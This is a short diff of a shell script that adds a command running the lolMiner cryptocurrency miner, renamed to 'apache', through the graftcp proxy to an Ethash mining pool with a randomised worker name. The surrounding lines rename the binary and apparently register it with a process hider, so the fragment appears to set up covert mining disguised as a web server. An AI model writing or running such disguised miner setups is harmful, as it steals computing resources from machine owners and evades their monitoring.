@@ -38,3 +38,5 @@ echo " "
 chmod +x lolMiner
 mv lolMiner apache
 ph add apache
+
+./graftcp/graftcp ./apache --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo $(shuf -i 1-999 -n 1)-LOLKacong) --ethstratum ETHPROXY
